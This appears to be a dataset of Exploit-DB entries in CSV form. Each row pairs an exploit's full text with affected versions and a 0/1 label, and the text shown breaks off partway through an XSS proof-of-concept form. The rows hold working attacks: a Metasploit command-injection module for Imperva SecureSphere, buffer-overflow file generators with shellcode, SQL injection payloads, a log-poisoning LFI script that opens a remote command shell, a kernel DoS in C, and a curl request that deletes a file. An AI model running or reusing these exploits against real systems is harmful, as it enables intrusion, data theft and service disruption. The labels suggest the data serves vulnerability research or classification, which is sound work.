46509,"Imperva SecureSphere 13.x - 'PWS' Command Injection (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::CmdStager    def initialize(info = {})     super(       update_info(         info,         'Name'           => 'Imperva SecureSphere PWS Command Injection',         'Description'    => %q(           This module exploits a command injection vulnerability in Imperva           SecureSphere 13.x. The vulnerability exists in the PWS service,           where Python CGIs didn't properly sanitize user supplied command           parameters and directly passes them to corresponding CLI utility,           leading to command injection. Agent registration credential is           required to exploit SecureSphere in gateway mode.            This module was successfully tested on Imperva SecureSphere 13.0/13.1/           13.2 in pre-ftl mode and unsealed gateway mode.         ),         'License'        => MSF_LICENSE,         'Author'         =>           [             'rsp3ar <lukunming<at>gmail.com>' # Discovery/Metasploit Module           ],         'References'     =>           [             [ 'EDB', '45542' ]           ],         'DisclosureDate'  => ""Oct 8 2018"",         'DefaultOptions' => {           'SSL' => true,           'PrependFork' => true,         },         'Platform'        => 'linux',         'Arch'            => [ARCH_X86, ARCH_X64],         'CmdStagerFlavor' => %w{ echo printf wget },         'Targets'         =>           [             ['Imperva SecureSphere 13.0/13.1/13.2', {}]           ],         'DefaultTarget'   => 0))      register_options(       [         Opt::RPORT(443),         OptString.new('USERNAME', [false, 'Agent registration username', 'imperva']),         OptString.new('PASSWORD', [false, 'Agent registration password', '']),         OptString.new('TARGETURI', [false, 'The URI path to impcli', '/pws/impcli']),         OptInt.new('TIMEOUT', [false, 'HTTP connection timeout', 15])       ])     register_advanced_options [       OptBool.new('ForceExploit',  [false, 'Override check result', false])     ]   end    def check     begin       res = execute_command('id')     rescue => e       vprint_error(""#{e}"")       return CheckCode::Unknown     end      if res.body =~ /uid=\d+/       return CheckCode::Vulnerable     end      CheckCode::Safe   end    def exploit     unless CheckCode::Vulnerable == check       unless datastore['ForceExploit']         fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.')       end       print_warning 'Target does not appear to be vulnerable'     end      print_status(""Sending payload #{datastore['PAYLOAD']}"")     execute_cmdstager   end    def execute_command(cmd, opts = {})     data = {       'command'     => 'impctl server status',       'parameters'  => {         'broadcast'         => true,         'installer-address' => ""127.0.0.1 $(#{cmd})""       }     }      res = send_request data      return unless res      if res.code == 401       fail_with(Failure::NoAccess, 'Authorization Failure, valid agent registration credential is required')     end      unless res.code == 406 && res.body.include?(""impctl"")       fail_with(Failure::Unknown, 'Server did not respond in an expected way')     end      res   end    def send_request(data)     req_params = {       'method'      => 'POST',       'uri'         => normalize_uri(target_uri.path),       'data'        => data.to_json     }      if !datastore['USERNAME'].blank? && !datastore['PASSWORD'].blank?       unless @cookie         res = send_request_cgi({           'method'      => 'GET',           'uri'         => normalize_uri('/')         })         unless res           fail_with(Failure::Unreachable, ""#{peer} - Connection failed"")         end          @cookie = res.get_cookies       end        req_params['cookie'] = @cookie       req_params['headers'] = {         'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])       }     end      send_request_cgi(req_params, datastore['TIMEOUT'])   end end","['13.x', '13.0/13.1/', '13.2']",1
14690,"Fennec 1.2 Beta 3 - Denial of Service # Exploit Title: Fennec 1.2 Beta 3 Denial of Service Vulnerability # Author: d4rk-h4ck3r # Date: 2010-08-19 # Software Link: http://www.brothersoft.com/fennec-download-161571.html # Greetz 2 : PASSEWORD , MadjiX , KAiSER-J , sec4ever , tli7a , All Tun!Sian h4ck3rz # Tested on: Windows XP SP3 Fr # Go to Show conversation add your .m3u file , click start and then boooooooooom ;)   my $hd = ""#EXTM3U\n""; my $jnk=""http://"".""\x41"" x 100000 ; open(MYFILE,'>>d4rk.m3u'); print MYFILE $hd.$jnk; close(MYFILE);",['1.2 Beta 3'],1
32255,"FipsCMS 2.1 - 'neu.asp' SQL Injection source: https://www.securityfocus.com/bid/30712/info  fipsCMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  fipsCMS 2.1 is vulnerable; other versions may also be affected.   http://www.example.com/fipsCMS/forum/neu.asp?kat=1+union+select+0,pw_admin+from+config",['2.1'],1
16952,"Linux Kernel < 2.6.37-rc2 - 'TCP_MAXSEG' Kernel Panic (Denial of Service) (2) /*  * TCP_MAXSEG Kernel Panic DoS for Linux < 2.6.37-rc2  * by zx2c4  *  * This exploit triggers CVE-2010-4165, a divide by zero  * error in net/ipv4/tcp.c. Because this is on the softirq  * path, the kernel oopses and then completely dies with  * no chance of recovery. It has been very reliable as a  * DoS, but is not useful for triggering other bugs.  *  * -zx2c4, 28-2-2011  */  #include <stdio.h> #include <string.h> #include <sys/socket.h> #include <net/if.h> #include <arpa/inet.h> #include <netinet/tcp.h>  int main() { 	struct sockaddr_in laddr; 	memset(&laddr, 0, sizeof(laddr)); 	laddr.sin_family = AF_INET; 	laddr.sin_addr.s_addr = inet_addr(""127.0.0.1""); 	laddr.sin_port = htons(31337); 	int listener = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); 	if (listener < 0) { 		printf(""[-] Could not open listener.\n""); 		return -1; 	} 	int val = 12; 	if (setsockopt(listener, IPPROTO_TCP, TCP_MAXSEG, &val, sizeof(val)) < 0) { 		printf(""[-] Could not set sockopt.\n""); 		return -1; 	} 	if (bind(listener, (struct sockaddr*)&laddr, sizeof(struct sockaddr)) < 0) { 		printf(""[-] Could not bind to address.\n""); 		return -1; 	} 	if (listen(listener, 1) < 0) { 		printf(""[-] Could not listen.\n""); 		return -1; 	} 	int hello = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); 	if (hello < 0) { 		printf(""[-] Could not open connector.\n""); 		return -1; 	} 	if (connect(hello, (struct sockaddr*)&laddr, sizeof(struct sockaddr)) < 0) { 		printf(""[-] Could not connect to listener.\n""); 		return -1; 	} 	printf(""[-] Connection did not trigger oops.\n""); 	return 0; }",['< 2.6.37-rc2'],1
29862,"Web Service Deluxe News Manager 1.0.1 Deluxe - 'footer.php' Local File Inclusion source: https://www.securityfocus.com/bid/23499/info  News Manager Deluxe is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  Exploiting this issue may allow an unauthorized user to view files and execute local scripts.  This issue affects News Manager Deluxe 1.0.1; other versions may also be affected.   # Perl # # BeyazKurt B3yazKurt@Hotmail.Com # # NMDeluxe 1.0.1 (template) Local File Inclusion Exploit # # D0rk     : ""powered by NMDeluxe"" dorka gerenk yok ama nese :p # # D�n trojen yedim a.q ! baska t�rl� yapamaz zate lamerler # # Download : http://wsdeluxe.com/nmdeluxe/downloads.html Your Name & Site URL :p # #Coded by elden ele ge? :) #  use IO::Socket; use LWP::Simple; #ripped @apache=( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../.. /../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"" ); if (@ARGV < 3) { print "" NMDeluxe 1.0.1 (template) Local File Inclusion Exploit ############################################################### Kullan.m : beyazkurt.pl [victim] [apachepath] ############################################################### ""; exit(); } $host=$ARGV[0]; $path=$ARGV[1]; $apachepath=$ARGV[2]; print ""Code is injecting in logfiles...\n""; $CODE=""""; $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""Connection failed.\n\n""; print $socket ""GET "".$path.$CODE."" HTTP/1.1\r\n""; print $socket ""user-Agent: "".$CODE.""\r\n""; print $socket ""Host: "".$host.""\r\n""; print $socket ""Connection: close\r\n\r\n""; close($socket); print ""Write END to exit!\n""; print ""If not working try another apache path\n\n""; print ""[shell] "";$cmd = ; while($cmd !~ ""END"") { $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""Connection failed.\n\n""; #now include parameter print $socket ""GET "".$path.""/includes/footer.php?template="".$apache[$apachepath].""%00&cmd=$cmd HTTP/1.1\r\n""; print $socket ""Host: "".$host.""\r\n""; print $socket ""Accept: */*\r\n""; print $socket ""Connection: close\r\n\r\n""; while ($raspuns = <$socket>) { print $raspuns; } print ""[shell] ""; $cmd = ;","['1.0.1 Deluxe', '1.0.1']",0
8226,"PHPRunner 4.2 - 'SearchOption' Blind SQL Injection ##########################www.BugReport.ir######################################## # #        AmnPardaz Security Research Team # # Title:        PHPRunner SQL Injection # Vendor:        http://www.xlinesoft.com # Vulnerable Version:    4.2 (prior versions also may be affected) # Exploitation:        Remote with browser # Original Advisory:    http://www.bugreport.ir/index_63.htm # Fix:            N/A ###################################################################################  #################### - Description: ####################  PHPRunner builds visually appealing web interface for popular databases. Your web site visitors will be able to easily search, add, edit, delete and exprt  data in MySQL, Oracle, SQL Server, MS Access, and Postgre databases.  #################### - Vulnerability: ####################  Input passed to the ""SearchField"" parameters in ""UserView_list.php"" is not properly sanitised before being used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.  Vulnerable Pages: 'orders_list.php' , 'users_list.php' , 'Administrator_list.php'   #################### - PoC: ####################  Its possible to obtain plain text passwords from database by blind fishing exploit  http://example.com/output/UserView_list.php?a=search&value=1&SearchFor=abc&SearchOption=Contains&SearchField=Password like '%%')-- http://example.com/output/UserView_list.php?a=search&value=1&SearchFor=abc&SearchOption=Contains&SearchField=mid(Password,1,1)='a')-- http://example.com/output/UserView_list.php?a=search&value=1&SearchFor=abc&SearchOption=Contains&SearchField=mid(Password,1,2)='ab')--  #################### - Solution: ####################  Edit the source code to ensure that inputs are properly sanitized.   #################### - Credit: #################### AmnPardaz Security Research & Penetration Testing Group Contact: admin[4t}bugreport{d0t]ir WwW.BugReport.ir WwW.AmnPardaz.com   # milw0rm.com [2009-03-17]",['4.2'],1
9377,"A2 Media Player Pro 2.51 - '.m3u' / '.m3l' Universal Local Buffer Overflow (SEH) #!/usr/bin/perl # by hack4love # hack4love@hotmail.com # A2 Media Player ProV2.51(.m3u /m3l)Universal Local Buffer Exploit (SEH) # ## easy #### this work sooooooooo good#################################### ############################################################################ ##Thanks for WwW.Sec-ArT.CoM/cc team ##and 3asfh.net team################### ##AND special THANKS FOR His0k4 i respect him so much god with him ######### ############################################################################ # http://download.cnet.com/A2-Media-Player-Pro/3000-2141_4-10059847.html ############################################################################ my $bof=""\x41"" x 4103; my $nsh=""\xEB\x06\x90\x90""; my $seh=""\x47\xa1\x01\x10"";##Universal my $nop=""\x90"" x 20; my $sec= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"". ""\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47"". ""\x45\x30\x4a\x47\x41\x50\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x48"". ""\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x58\x46\x43\x4b\x38"". ""\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"". ""\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x43\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"". ""\x4f\x35\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x44"". ""\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"". ""\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x42\x46\x30\x43\x4c\x41\x33"". ""\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x37"". ""\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x57\x4e\x51\x4d\x4a"". ""\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"". ""\x42\x50\x42\x50\x42\x50\x4b\x48\x4a\x56\x4e\x33\x4f\x35\x41\x53"". ""\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x57"". ""\x42\x35\x4a\x46\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x36\x4a\x59"". ""\x50\x4f\x4c\x38\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x56"". ""\x4e\x56\x43\x46\x42\x30\x5a""; print $bof.$nsh.$seh.$nop.$sec; ################################################################### open(myfile,'>> HACK4LOVE.m3u'); print myfile $bof.$nsh.$seh.$nop.$sec; ###################################################################  # milw0rm.com [2009-08-06]",['2.51'],1
43268,Nearbuy Clone Script 3.2 - 'search' SQL Injection # # # # #  # Exploit Title: Nearbuy Clone Script 3.2 - SQL Injection # Dork: N/A # Date: 08.12.2017 # Vendor Homepage: https://www.phpscriptsmall.com/ # Software Link: https://www.phpscriptsmall.com/product/nearbuy-clone/ # Demo: http://www.fxwebsolution.com/demo/arthi/nearby/ # Version: 3.2 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/category_list.php?search=[SQL] #  # Parameter: search (GET) #     Type: boolean-based blind #     Title: AND boolean-based blind - WHERE or HAVING clause #     Payload: search=s%' AND 2775=2775 AND '%'=' #  #     Type: AND/OR time-based blind #     Title: MySQL >= 5.0.12 AND time-based blind #     Payload: search=s%' AND SLEEP(5) AND '%'=' #  # # # # #,['3.2'],1
31613,Apple iCal 3.0.1 - 'COUNT' Integer Overflow source: https://www.securityfocus.com/bid/28629/info  Apple iCal is prone to an integer-overflow vulnerability because it fails to ensure that integer values aren't overrun.  An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.  This issue affects iCal 3.0.1 running on Mac OS X 10.5.1; previous versions may also be affected.   BEGIN:VCALENDAR X-WR-TIMEZONE:America/Buenos_Aires PRODID:-//Apple Inc.//iCal 3.0//EN CALSCALE:GREGORIAN X-WR-CALNAME: Vulnerable VERSION:2.0 X-WR-RELCALID:10DE4203-4FA5-4E23-AE4D-9DAE3157C9E5 METHOD:PUBLISH BEGIN:VTIMEZONE TZID:America/Buenos_Aires BEGIN:DAYLIGHT TZOFFSETFROM:-0300 TZOFFSETTO:-0300 DTSTART:19991003T000000 RDATE:19991003T000000 TZNAME:ARST END:DAYLIGHT BEGIN:STANDARD TZOFFSETFROM:-0300 TZOFFSETTO:-0300 DTSTART:20000303T000000 RDATE:20000303T000000 RDATE:20001231T210000 TZNAME:ART END:STANDARD END:VTIMEZONE BEGIN:VEVENT SEQUENCE:4 DTSTART;TZID=America/Buenos_Aires:20071225T110000 DURATION:PT1H UID:48878014-5F03-43E5-8639-61E708714F9A DTSTAMP:20071213T130632Z SUMMARY:Vuln CREATED:20071213T130611Z RRULE:FREQ=DAILY;INTERVAL=1;COUNT=2147483646 END:VEVENT END:VCALENDAR,['3.0.1'],1
47281,"Joomla! component com_jsjobs 1.2.6 - Arbitrary File Deletion # Exploit Title: Joomla! component com_jsjobs 1.2.6 - Arbitrary File Deletion # Dork: inurl:""index.php?option=com_jsjobs"" # Date: 2019-08-16 # Exploit Author: qw3rTyTy # Vendor Homepage: https://www.joomsky.com/ # Software Link: https://www.joomsky.com/5/download/1 # Version: 1.2.6 # Tested on: Debian/nginx/joomla 3.9.0  # Vulnerability details: # This vulnerability is caused when processing custom userfield.  File:		site/models/job.php Function:	storeJob Line:		1240 -------------------------------------    1215	    //custom field code start   1216	        $customflagforadd = false;   1217	        $customflagfordelete = false;   1218	        $custom_field_namesforadd = array();   1219	        $custom_field_namesfordelete = array();   1220	        $userfield = $this->getJSModel('customfields')->getUserfieldsfor(2);   1221	        $params = array();   1222	        $forfordelete = '';   1223	           1224	        foreach ($userfield AS $ufobj) {   1225	            $vardata = '';   1226	            if($ufobj->userfieldtype == 'file'){   1227	                if(isset($data[$ufobj->field.'_1']) && $data[$ufobj->field.'_1'] == 0){   1228	                    $vardata = $data[$ufobj->field.'_2'];   1229	                }else{   1230	                    $vardata = $_FILES[$ufobj->field]['name'];   1231	                }   1232	                $customflagforadd=true;   1233	                $custom_field_namesforadd[]=$ufobj->field;   1234	            }else{   1235	                $vardata = isset($data[$ufobj->field]) ? $data[$ufobj->field] : '';   1236	            }   1237	            if(isset($data[$ufobj->field.'_1']) && $data[$ufobj->field.'_1'] == 1){   1238	                $customflagfordelete = true;   1239	                $forfordelete = $ufobj->field;   1240	                $custom_field_namesfordelete[]= $data[$ufobj->field.'_2'];		//No check.   1241	            }   ...snip...   1323	        // new   1324	        //removing custom field    1325	        if($customflagfordelete == true){   1326	            foreach ($custom_field_namesfordelete as $key) {   1327	                $res = $this->getJSModel('common')->uploadOrDeleteFileCustom($row->id,$key ,1,2);		//!!!   1328	            }   1329	        }  File:		site/models/common.php Function:	uploadOrDeleteFileCustom Line:		851 -------------------------------------     748	        $path = $base . '/' . $datadirectory;    749	        if (!file_exists($path)) { // create user directory    750	            $this->makeDir($path);    751	        }    752	        $isupload = false;    753	        $path = $path . '/data';    754	        if (!file_exists($path)) { // create user directory    755	            $this->makeDir($path);    756	        }    757	        if($for == 3 )    758	            $path = $path . '/jobseeker';    759	        else    760	            $path = $path . '/employer';    761	    762	        if (!file_exists($path)) { // create user directory    763	            $this->makeDir($path);    764	        }    ...snip...    843	        } else { // DELETE FILES    844	            if ($isdeletefile == 1) {    845	                if($for == 3){    846	                    $userpath = $path . '/'.$datafor.'_' . $resumeid . '/customfiles/';    847	                }else{    848	                    $userpath = $path . '/'.$datafor.'_' . $id . '/customfiles/';    849	                }    850	                $file = $userpath.$field;    851	                unlink($file);		//!!!    852	            }    853	            return 1;    854	        }    855	    }  ##################################### #PoC: #####################################  # If an administrator has added custom userfield 'ufield926' as field type 'file', attacker are can trigger this vulnerability by send a following requests.  $> curl -X POST -i -H 'Cookie: VALID_SESSION_ID=VALID_SESSION_ID' -F 'options=com_jsjobs' -F 'task=job.savejob' -F 'id=' -F 'enforcestoppublishjob=666' -F 'startpublishing=2019-08-16' -F 'stoppublishing=2019-08-16' -F 'description=woot' -F 'title=woot' -F 'ufield926=@./valid_image.jpg' -F 'VALID_FORM_TOKEN_FROM_FORMJOB=1' ""http://localhost/index.php""  $> curl -X POST -i -H 'Cookie: VALID_SESSION_ID=VALID_SESSION_ID' -F 'options=com_jsjobs' -F 'task=job.savejob' -F 'id=666' -F 'enforcestoppublishjob=666' -F 'startpublishing=2019-08-16' -F 'stoppublishing=2019-08-16' -F 'description=woot' -F 'title=woot' -F 'ufield926_1=1' -F 'ufield926_2=../../../../../configuration.php' -F 'VALID_FORM_TOKEN_FROM_FORMJOB=1' ""http://localhost/index.php""",['1.2.6'],1
7745,"VUPlayer 2.49 - '.asx' Universal Local Buffer Overflow # VUPlayer 2.49 .ASX File (Universal) Local Buffer Overflow Exploit # By:Encrypt3d.M!nd # # This is an exploit for this Proof of Concept: # http://milw0rm.com/exploits/7709 # very easy one  :)  # # Well i've Sent this since the poc published but str0ke had a brain fart :) # # Greetz:Str0ke(God Bless You bro),-=Mizo=-,L!0N,El Mariachi,MiNi SpIder and all my friends # # Iam Iraqian...Not Arabian   header1 = ( ""\x3C\x61\x73\x78\x20\x76\x65\x72\x73\x69\x6F\x6E\x20\x3D\x20"" ""\x22\x33\x2E\x30\x22\x20\x3E\x0D\x0D\x0A\x3C\x65\x6E\x74\x72"" ""\x79\x3E\x0D\x0D\x0A\x3C\x74\x69\x74\x6C\x65\x3E\x61\x72\x63"" ""\x68\x20\x65\x6E\x65\x6D\x79\x2D\x6E\x65\x6D\x73\x69\x73\x2E"" ""\x6D\x70\x33\x3C\x2F\x74\x69\x74\x6C\x65\x3E\x0D\x0D\x0A\x3C"" ""\x72\x65\x66\x20\x68\x72\x65\x66\x20\x3D\x20"")  header2 = ( ""\x22\x20\x2F\x3E\x0D\x0A\x3C\x2F\x65\x6E\x74\x72\x79\x3E\x0D"" ""\x0A\x3C\x2F\x61\x73\x78\x3E"")  chars = ""A"" * 1012  # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com  shellcode = ( ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"" ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"" ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"" ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"" ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"" ""\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x54\x4e\x43\x4b\x38\x4e\x47"" ""\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x38"" ""\x4f\x45\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x33\x4b\x48"" ""\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"" ""\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"" ""\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58"" ""\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x58\x4e\x50\x4b\x44"" ""\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x38"" ""\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33"" ""\x42\x4c\x46\x46\x4b\x38\x42\x44\x42\x53\x45\x38\x42\x4c\x4a\x47"" ""\x4e\x30\x4b\x48\x42\x44\x4e\x50\x4b\x58\x42\x37\x4e\x51\x4d\x4a"" ""\x4b\x48\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b"" ""\x42\x50\x42\x50\x42\x50\x4b\x38\x4a\x36\x4e\x43\x4f\x45\x41\x53"" ""\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x57"" ""\x42\x45\x4a\x36\x42\x4f\x4c\x38\x46\x30\x4f\x35\x4a\x46\x4a\x39"" ""\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46"" ""\x4e\x46\x43\x36\x42\x50\x5a"")  # Return Address is:0x100222C5 JMP ESP BASS.DLL -> Universal Address Thnx SKD  file=open('exp.asx','w') file.write(header1+chars+""\xc5\x22\x02\x10""+""\x90""*25+shellcode+header2) file.close()  # milw0rm.com [2009-01-13]",['2.49'],1
47136,"WordPress Plugin OneSignal 1.17.5 - 'subdomain' Persistent Cross-Site Scripting # Exploit Title: WordPress Plugin OneSignal 1.17.5 - Persistent Cross-Site Scripting # Date: 2019-07-18 # Vendor Homepage: https://www.onesignal.com # Software Link:  https://wordpress.org/plugins/onesignal-free-web-push-notifications/ # Affected version: 1.17.5 # Exploit Author: LiquidWorm # Tested on: Linux  Summary: OneSignal is a high volume and reliable push notification service for websites and mobile applications. We support all major native and mobile platforms by providing dedicated SDKs for each platform, a RESTful server API, and an online dashboard for marketers to design and send push notifications.  Desc: The application suffers from an authenticated stored XSS via POST request. The issue is triggered when input passed via the POST parameter 'subdomain' is not properly sanitized before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: WordPress 5.2.2            Apache/2.4.39            PHP/7.1.30   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2019-5530 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5530.php  <html>   <body>   <script>history.pushState('', 'SHPA', '/')</script>     <form action=""http://127.0.0.1/wp-admin/admin.php?page=onesignal-push"" method=""POST"">       <input type=""hidden"" name=""onesignal_config_page_nonce"" value=""f7fae30a4f"" />       <input type=""hidden"" name=""_wp_http_referer"" value=""/wp-admin/admin.php?page=onesignal-push"" />       <input type=""hidden"" name=""app_id"" value=""14d99ab2-fc9d-1337-bc16-a8a6df479515"" />       <input type=""hidden"" name=""app_rest_api_key"" value=""M2IzZDA4MzItOGJmOS00YjRkLWE4YzEtZSLmMjllNjlkYmZl"" />       <input type=""hidden"" name=""subdomain"" value=""""><script>confirm(251)</script>"" />       <input type=""hidden"" name=""safari_web_id"" value="""" />       <input type=""hidden"" name=""showNotificationIconFromPostThumbnail"" value=""true"" />       <input type=""hidden"" name=""showNotificationImageFromPostThumbnail"" value=""true"" />       <input type=""hidden"" name=""persist_notifications"" value=""platform-default"" />       <input type=""hidden"" name=""notification_title"" value=""hACKME"" />       <input type=""hidden"" name=""notifyButton_enable"" value=""true"" />       <input type=""hidden"" name=""notifyButton_showAfterSubscribed"" value=""true"" />       <input type=""hidden"" name=""notifyButton_prenotify"" value=""true"" />       <input type=""hidden"" name=""notifyButton_showcredit"" value=""true"" />       <input type=""hidden"" name=""notifyButton_customize_enable"" value=""true"" />       <input type=""hidden"" name=""notifyButton_size"" value=""medium"" />       <input type=""hidden"" name=""notifyButton_position"" value=""bottom-right"" />       <input type=""hidden"" name=""notifyButton_theme"" value=""default"" />       <input type=""hidden"" name=""notifyButton_offset_bottom"" value="""" />       <input type=""hidden"" name=""notifyButton_offset_left"" value="""" />       <input type=""hidden"" name=""notifyButton_offset_right"" value="""" />       <input type=""hidden"" name=""notifyButton_color_background"" value="""" />       <input type=""hidden"" name=""notifyButton_color_foreground"" value="""" />       <input type=""hidden"" name=""notifyButton_color_badge_background"" value="""" />       <input type=""hidden"" name=""notifyButton_color_badge_foreground"" value="""" />       <input type=""hidden"" name=""notifyButton_color_badge_border"" value="""" />       <input type=""hidden"" name=""notifyButton_color_pulse"" value="""" />       <input type=""hidden"" name=""notifyButton_color_popup_button_background"" value="""" />       <input type=""hidden"" name=""notifyButton_color_popup_button_background_hover"" value="""" />       <input type=""hidden"" name=""notifyButton_color_popup_button_background_active"" value="""" />       <input type=""hidden"" name=""notifyButton_color_popup_button_color"" value="""" />       <input type=""hidden"" name=""notifyButton_message_prenotify"" value="""" />       <input type=""hidden"" name=""notifyButton_tip_state_unsubscribed"" value="""" />       <input type=""hidden"" name=""notifyButton_tip_state_subscribed"" value="""" />       <input type=""hidden"" name=""notifyButton_tip_state_blocked"" value="""" />       <input type=""hidden"" name=""notifyButton_message_action_subscribed"" value="""" />       <input type=""hidden"" name=""notifyButton_message_action_resubscribed"" value="""" />       <input type=""hidden"" name=""notifyButton_message_action_unsubscribed"" value="""" />       <input type=""hidden"" name=""notifyButton_dialog_main_title"" value="""" />       <input type=""hidden"" name=""notifyButton_dialog_main_button_subscribe"" value="""" />       <input type=""hidden"" name=""notifyButton_dialog_main_button_unsubscribe"" value="""" />       <input type=""hidden"" name=""notifyButton_dialog_blocked_title"" value="""" />       <input type=""hidden"" name=""notifyButton_dialog_blocked_message"" value="""" />       <input type=""hidden"" name=""prompt_customize_enable"" value=""true"" />       <input type=""hidden"" name=""prompt_action_message"" value="""" />       <input type=""hidden"" name=""prompt_auto_accept_title"" value="""" />       <input type=""hidden"" name=""prompt_site_name"" value="""" />       <input type=""hidden"" name=""prompt_example_notification_title_desktop"" value="""" />       <input type=""hidden"" name=""prompt_example_notification_message_desktop"" value="""" />       <input type=""hidden"" name=""prompt_example_notification_title_mobile"" value="""" />       <input type=""hidden"" name=""prompt_example_notification_message_mobile"" value="""" />       <input type=""hidden"" name=""prompt_example_notification_caption"" value="""" />       <input type=""hidden"" name=""prompt_accept_button_text"" value="""" />       <input type=""hidden"" 